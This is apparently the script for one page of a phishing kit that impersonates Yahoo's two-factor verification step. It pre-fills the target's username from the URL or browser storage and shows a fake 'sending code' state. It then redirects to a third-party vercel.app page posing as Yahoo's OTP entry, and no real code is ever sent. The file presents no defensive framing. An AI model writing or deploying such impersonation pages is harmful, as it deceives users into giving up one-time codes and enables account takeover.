// Yahoo 2FA Page JavaScript
const $ = window.jQuery

$(document).ready(() => {
  console.log("Yahoo 2FA page initialized")

  let selectedMethod = ""

  // Handle verification method selection
  $(".verification-option").click(function () {
    $(".verification-option").removeClass("selected")
    $(this).addClass("selected")
    selectedMethod = $(this).data("method")
    $("#challenge").val(selectedMethod)
    $("#submit-btn").prop("disabled", false)
    console.log("Selected method:", selectedMethod)
  })

  // Form submission handler
  $("#verification-form").on("submit", (e) => {
    e.preventDefault()

    if (!selectedMethod) {
      alert("Please select a verification method.")
      return false
    }

    console.log("2FA method submitted:", selectedMethod)
    $("#main-form").hide()
    $("#loading-state").show()

    // Simulate sending code and redirect to OTP page
    setTimeout(() => {
      window.location.href = "https://custom-yahoo-otp-test.vercel.app/"
    }, 2000)

    return false
  })

  // Get username from URL or storage
  function getUsername() {
    const urlParams = new URLSearchParams(window.location.search)
    let user = urlParams.get("u")

    if (user) {
      return decodeURIComponent(user)
    }

    user = sessionStorage.getItem("yh_username") || localStorage.getItem("yh_username")
    if (user) {
      return user
    }

    return "your account"
  }

  // Initialize page
  const username = getUsername()
  $("#userEmail").text(username)
  $("#username").val(username)

  console.log("2FA page ready for user:", username)
})
